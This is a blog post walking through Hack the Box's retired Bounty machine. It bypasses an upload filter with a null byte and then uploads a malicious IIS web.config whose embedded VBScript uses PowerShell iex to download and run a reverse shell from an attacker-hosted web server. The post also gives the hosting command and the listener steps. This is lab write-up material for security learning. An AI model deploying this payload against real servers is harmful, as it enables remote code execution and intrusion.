---
layout: post
title:  "Using web.config to Bypass File Upload Restrictions"
author: nanobyte
date:   2021-09-13
description: How to leverage web.config for bypassing a file upload restriction
tags: PowerShell HTB_Walkthrough BypassUploadRestriction
---

<h2>Bypassing Upload Restrictions</h2>

The following attack was identified during Hack the Box's retirned Bounty machine. In that vulnerable machine, there was access to a file upload. The application only took JPG extensions. This could be defeated by adding a null byte at the end of the file extension. To add this null byte, we wil type in %00, then the required JPG extension.

First use Burp Suite and enable intercept. Once ready, upload a file, in this scenario transfer.aspx is being uploaded:

<center><img src="/images/posts/webconfig-writeup/image_1.png" alt="upload-file"></center>

Once intercepted, we can add our null byte after our ASPX extension, and before our JPG extension:

<center><img src="/images/posts/webconfig-writeup/image_2.png" alt="burp-suite-intercept"></center>

If we were to send this to the server, we will see a successful file upload:

<center><img src="/images/posts/webconfig-writeup/image-3.png" alt="file-upload-success"></center>

However, if we navigate to this file, we would receive the following error:

<center><img src="/images/posts/webconfig-writeup/image-4.png" alt="file-load-error"></center>

With the presence of web.config present, and the ability to bypass file upload restrictions discovered, we can create a malicious web.config, and upload a version that is useful to us, as attackers.

<h2>Malicious web.config</h2>

We can create our own malicious web.config file, which contains a PowerShell command to download a reverse shell hosted on a web server:

{% highlight bash linenos %}
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />       
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/reverse.ps1')")
%>
{% endhighlight %}

Before you upload this file to the server, make sure that you host a PowerShell reverse shell hosted on your local machine. Here are some great PowerShell options available from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell" target="_blank">PayloadAllTheThings</a>.

Once a PowerShell reverse shell is saved on your local machine, you must setup a web server to host this file. I generally usen a Python SimpleHTTPServer. This can be quickly setup with the following command, from the directory your reverse shell is saved in:

{% highlight bash linenos %}
python -m SimpleHTTPServer 80
{% endhighlight %}

Once the above is setup and ready to go, you can then upload the malicious web.config file. You must perform the same bypass restriction, adding the required null byte and JPG extension. Once on the server, open a NetCat listener, and open the web.config file on the web server. Completing the above, a reverse connection was received:

<center><img src="/images/posts/webconfig-writeup/image-5.png" alt="burp-suite-intercept"></center>
